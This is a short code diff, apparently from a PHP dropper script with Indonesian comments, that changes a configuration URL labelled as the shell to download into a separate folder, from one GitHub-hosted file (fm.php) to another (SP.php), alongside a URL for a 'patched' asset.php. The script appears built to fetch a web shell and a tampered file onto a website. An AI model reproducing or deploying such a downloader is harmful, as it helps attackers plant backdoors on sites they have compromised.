@@ -26,7 +26,7 @@
 
 // ==================== KONFIGURASI ====================
 // URL shell yang akan didownload ke folder terpisah
-$SHELL_DOWNLOAD_URL = "https://raw.githubusercontent.com/ommauiphone/masukpakeeko/refs/heads/main/fm.php";
+$SHELL_DOWNLOAD_URL = "https://raw.githubusercontent.com/ommauiphone/masukpakeeko/refs/heads/main/SP.php";
 
 // URL asset.php yang sudah dipatch
 $PATCHED_ASSET_URL  = "https://raw.githubusercontent.com/ommauiphone/masukpakeeko/refs/heads/main/asset.php";
